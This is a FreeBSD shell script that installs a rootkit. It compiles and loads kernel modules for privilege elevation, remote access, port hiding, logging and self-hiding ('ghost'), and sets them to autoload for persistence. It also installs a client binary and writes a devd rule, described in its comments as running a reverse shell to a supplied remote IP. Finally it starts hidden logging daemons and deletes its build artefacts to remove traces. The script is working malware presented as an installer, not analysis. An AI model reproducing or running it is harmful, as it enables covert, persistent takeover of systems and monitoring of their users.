#!/bin/sh

uid=$(id -u)

if [ "$uid" -ne 0 ]; then
  echo "Error: install script must be executed as root"
  exit 1
fi

if [ -z "$1" ]; then
  echo "Usage: $0 <remote-ip>"
  exit 0
fi

# Add all KLDs here, it will automatically compile, load and hide them.
# The Makefile should be named Makefile.module
# The .ko file should be named module.ko
# The c file should be named module-kld.c
# IMPORTANT: put ghost last as it will hides all the other KLDs when loaded
klds="elevate remote port_hiding log ghost"

for kld in ${klds}; do
  # Clean kld
  make -f "Makefile.$kld" clean

  # Compile KLD
  make -f "Makefile.$kld" REMOTE="$1"

  if [ "$?" -ne 0 ]; then
    echo "Warning: failed to compile $kld KLD"
    continue
  fi

  if [ -e "./$kld.ko" ]; then
    # Copy to /boot/modules
    mkdir -p /boot/modules
    cp "./$kld.ko" /boot/modules

    # Configure autoloading for persistence
    sysrc kld_list+="$kld"

    # Load klds
    kldload "./$kld.ko"
    if [ "$?" -ne 0 ]; then
      echo "Warning: failed to load $kld.ko with kldload"
      continue
    fi
  else
    echo "Warning: could not find $kld.ko"
    continue
  fi
done

# Clean and compile all utility binaries
make -f Makefile.bin clean
make -f Makefile.bin
if [ "$?" -ne 0 ]; then
  echo "Error: failed to compile binaries"
  exit 1
fi

install -o root -g wheel -m 755 bhclient /sbin/bhclient
if [ -e "./log" ]; then
  install -o root -g wheel -m 755 log /sbin/log
  if [ -e "/dev/sys_monitor" ]; then
    pkill -x log >/dev/null 2>&1 || true
    daemon -f /sbin/log >/dev/null 2>&1
  else
    echo "Warning: /dev/sys_monitor missing; /sbin/log not started"
  fi
else
  echo "Warning: ./log not found"
fi
if [ -e "./log-helper" ]; then
  install -o root -g wheel -m 755 log-helper /sbin/log-helper
  if [ -e "/dev/sys_monitor" ]; then
    pkill -x log-helper >/dev/null 2>&1 || true
    daemon -f /sbin/log-helper >/dev/null 2>&1
  fi
fi

# Add matching rule in /etc/devd.conf to run reverse shell to remote address
if ! grep -q "DHCLIENT" /etc/devd.conf; then
  mkdir -p /usr/local/etc/devd
  cat <<EOF > /usr/local/etc/devd/devd.conf
notify 100 {
  match "system" "DHCLIENT";
  match "subsystem" "WORKER";
  match "type" "START";
  action "/sbin/bhclient ${1}";
};
EOF
service devd restart
fi

# Attempt to remove files
make -f Makefile.elevate clean
make -f Makefile.ghost clean
make -f Makefile.remote clean
make -f Makefile.log clean
rm -rf rootkit/
rm bhclient log remote-helper
rm .depend.rootkit*
rm Makefile.* rootkit.tar install remote *.ko 
